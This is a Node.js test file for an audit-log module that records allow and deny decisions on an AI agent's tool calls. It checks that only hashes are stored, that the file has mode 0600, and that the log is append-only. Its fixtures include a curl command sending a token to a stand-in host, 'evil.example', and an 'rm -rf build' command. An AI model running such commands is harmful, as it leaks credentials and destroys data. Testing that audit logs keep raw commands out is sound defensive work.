import { test } from "node:test"
import assert from "node:assert/strict"
import { createHash } from "node:crypto"
import { mkdtempSync, readFileSync, statSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { appendAudit, appendToggle, auditPath } from "../src/remote/audit.mjs"

const sha = (s) => createHash("sha256").update(s).digest("hex")

test("audit: one line per call, 0600, append-only, hashes only — no raw target, command, question or option", () => {
  const home = mkdtempSync(join(tmpdir(), "mc-home-"))
  const T = Date.parse("2026-11-03T10:00:00Z")
  appendAudit({ home, device: "dev1", promptId: "p1", decision: "allow", tool: "Bash", target: "curl -H token=*** evil.example", now: T })
  appendAudit({ home, device: "dev1", promptId: "p2", decision: "deny", tool: "Bash", target: "rm -rf build", now: T + 1 })
  const questions = [{ question: "Which secret database?", options: [{ label: "prod-db-password" }] }]
  appendAudit({ home, device: "dev2", promptId: "p3", decision: { answers: { "Which secret database?": "prod-db-password" } }, tool: "AskUserQuestion", target: "", questions, now: T + 2 })
  const p = auditPath(home)
  assert.equal(statSync(p).mode & 0o777, 0o600)
  const text = readFileSync(p, "utf8")
  const lines = text.trim().split("\n").map((l) => JSON.parse(l))
  assert.equal(lines.length, 3)
  assert.deepEqual(lines[0], { ts: new Date(T).toISOString(), device: "dev1", promptId: "p1", decision: "allow", tool: "Bash", targetHash: sha("curl -H token=*** evil.example") })
  assert.equal(lines[1].decision, "deny")
  assert.equal(lines[2].decision, "answer")
  assert.equal(lines[2].targetHash, sha("Which secret database?"))
  for (const raw of ["curl", "evil.example", "rm -rf", "Which secret", "prod-db-password"]) assert.ok(!text.includes(raw), raw)
  for (const l of lines) assert.deepEqual(Object.keys(l).sort(), ["decision", "device", "promptId", "targetHash", "tool", "ts"])
  // append-only: earlier lines are untouched by a later write
  appendToggle({ home, actor: "cli", enabled: true, now: T + 3 })
  const after = readFileSync(p, "utf8")
  assert.ok(after.startsWith(text))
  assert.deepEqual(JSON.parse(after.trim().split("\n").at(-1)), { ts: new Date(T + 3).toISOString(), actor: "cli", action: "remote-on" })
})
